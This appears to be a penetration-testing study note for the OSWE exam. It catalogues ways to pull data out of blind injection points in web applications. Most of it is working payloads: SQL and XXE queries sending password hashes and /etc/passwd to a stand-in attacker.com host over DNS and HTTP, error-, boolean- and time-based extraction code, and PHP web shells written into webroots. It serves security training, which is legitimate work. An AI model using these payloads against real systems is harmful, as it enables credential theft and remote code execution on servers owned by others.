---
title: Data exfiltration from source review
slug: data-exfiltration-from-source
aliases: [data-exfil-source, oob-exfiltration]
---

> **TL;DR:** When direct output isn't available, exfiltrate data through OOB channels (DNS/HTTP callbacks), error messages, boolean conditions, time delays, or file writes to the webroot. Source review tells you which channel is viable before you waste hours on the wrong one.

## What it is
Data exfiltration in a whitebox context means choosing the right extraction channel based on what the source code reveals about output handling, error display, network egress, and filesystem access. The source tells you whether errors are verbose, whether DNS resolution is reachable, whether the app can write files — so you pick the optimal channel instead of guessing.

## Preconditions / where it applies
- Whitebox access to a web application (OSWE exam context)
- An injection point (SQLi, SSRF, command injection, XXE) that doesn't directly reflect output
- Understanding of the target's error handling, network posture, and filesystem permissions

## Channel 1: OOB via DNS callback

Works when the target can resolve external DNS but you can't see query output directly. The data rides in the subdomain label.

**Source indicators:** The app makes outbound HTTP/DNS requests, no strict egress firewall, functions like `LOAD_FILE()`, `UTL_HTTP`, `xp_dirtree`, or XXE with external entity resolution.

```sql
-- MySQL: DNS exfiltration via LOAD_FILE (Windows only)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'));

-- MSSQL: xp_dirtree triggers DNS lookup
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a';

-- PostgreSQL: dblink or COPY ... TO PROGRAM
SELECT dblink_connect('host=' || (SELECT password FROM users LIMIT 1) || '.attacker.com dbname=x');
```

**Receiver:** Use Burp Collaborator, interactsh, or a custom DNS listener:
```bash
# interactsh-client for OOB capture
interactsh-client -v
# Returns: abc123.oast.fun — use this as your callback domain
```

## Channel 2: OOB via HTTP callback

When the app can make outbound HTTP requests (SSRF, XXE with HTTP entity, SQL functions).

```sql
-- PostgreSQL: COPY ... TO PROGRAM with curl
COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl https://attacker.com/?d=$(cat /etc/passwd | base64 | head -c 60)';
```

```xml
<!-- XXE OOB exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<!-- evil.dtd on attacker server: -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>"> %all; -->
```

**Source review clue:** Look for XML parsers with external entity processing enabled — `DocumentBuilderFactory` without `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` in Java, `libxml_disable_entity_loader(false)` in PHP, `lxml.etree.parse` without `resolve_entities=False` in Python.

## Channel 3: Error-based extraction

When the app displays database errors or stack traces to the user. The fastest channel — full output in one request.

**Source indicators:** `DEBUG = True` (Django), `display_errors = On` (PHP), verbose error handlers, missing generic error pages.

```sql
-- MySQL: extractvalue / updatexml
SELECT extractvalue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)));
-- Error: "XPATH syntax error: '~s3cretP4ss'"

-- PostgreSQL: cast error
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
-- Error: "invalid input syntax for integer: 's3cretP4ss'"

-- MSSQL: convert error
SELECT CONVERT(int, (SELECT TOP 1 password FROM users));
-- Error: "Conversion failed when converting 's3cretP4ss'"
```

## Channel 4: Boolean-based extraction

When you get a binary signal (page differs, HTTP status, element presence) but no direct output.

**Source indicators:** The injection point is in a `WHERE` clause, and the page content changes based on query truth. See [[blind-sqli-techniques]] for full coverage.

```python
# Binary search — 7 requests per character instead of ~95
def extract_char(session, url, query, pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
        r = session.get(url, params={"id": payload})
        if is_true_condition(r):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if low <= 126 else None
```

## Channel 5: Time-based extraction

Last resort — slowest channel. Use only when no other signal exists.

**Source indicators:** No error output, no content difference, but the SQL engine supports `SLEEP`/`WAITFOR`/`pg_sleep`. The app doesn't have aggressive request timeouts.

```sql
-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109, SLEEP(2), 0)-- -

-- MSSQL
'; IF(ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>109) WAITFOR DELAY '0:0:2'-- -

-- PostgreSQL
'; SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109 THEN pg_sleep(2) ELSE pg_sleep(0) END-- -
```

**NOTE:** Network jitter makes time-based unreliable. Use a threshold (e.g., 1.5s for a 2s sleep) and retry ambiguous results. See [[oswe-exploit-scripting-guide]] for the automation pattern.

## Channel 6: File write to webroot

When the DB user or application has filesystem write permissions and you know the webroot path.

```sql
-- MySQL: INTO OUTFILE
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- PostgreSQL: COPY TO
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- MSSQL: OLE Automation / xp_cmdshell + echo
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

**Source review clue:** Check the DB connection's privilege level (`GRANT FILE`, superuser), the webroot path from config files, and whether `secure_file_priv` is empty or set.

## Choosing the right channel (decision tree)
1. Errors displayed? → **Error-based** (fastest)
2. Page content differs? → **Boolean-based** (fast, reliable)
3. Can write to webroot? → **File write** (one-shot RCE)
4. Outbound DNS/HTTP? → **OOB** (fast, but needs infra)
5. None of the above? → **Time-based** (slow, last resort)

## References
- [[blind-sqli-techniques]] — boolean and time-based extraction in depth
- [[oswe-exploit-scripting-guide]] — scripting the extraction pipeline
- [[postgresql-exploitation]] — PostgreSQL-specific exfil functions
- [[database-rce-from-sqli]] — escalating SQLi to command execution
- [PortSwigger — Blind SQLi](https://portswigger.net/web-security/sql-injection/blind) — lab-based practice
